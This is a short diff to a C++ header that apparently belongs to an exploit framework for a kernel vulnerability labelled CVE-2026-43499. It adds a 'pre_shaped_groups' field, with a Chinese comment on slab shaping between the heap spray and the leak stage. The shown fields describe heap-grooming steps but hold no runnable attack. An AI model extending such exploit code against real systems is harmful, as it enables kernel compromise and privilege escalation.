@@ -23,6 +23,8 @@ namespace ghostlock::backend::cve_2026_43499::memory {
     struct PrepareInputs final {
         /** How many children each group gets. */
         std::size_t pre_groups = 0U;
+        /** 退役 `pre_ctx`：spray **之后**、snitch **之前**（整形泄漏落点 ✓；值 = mm_objs_per_slab − 1）。 */
+        std::size_t pre_shaped_groups = 0U;
         std::size_t spray_groups = 0U;
         std::size_t post_groups = 0U;
         std::size_t leak_groups = 0U;
@@ -58,6 +60,8 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         const PrepareStep *steps = nullptr;
         std::size_t step_count = 0U;
         std::size_t pre_groups = 0U;
+        /** 退役 `pre_ctx`：spray **之后**、snitch **之前**（整形泄漏落点 ✓；值 = mm_objs_per_slab − 1）。 */
+        std::size_t pre_shaped_groups = 0U;
         std::size_t spray_groups = 0U;
         std::size_t post_groups = 0U;
         std::size_t leak_groups = 0U;
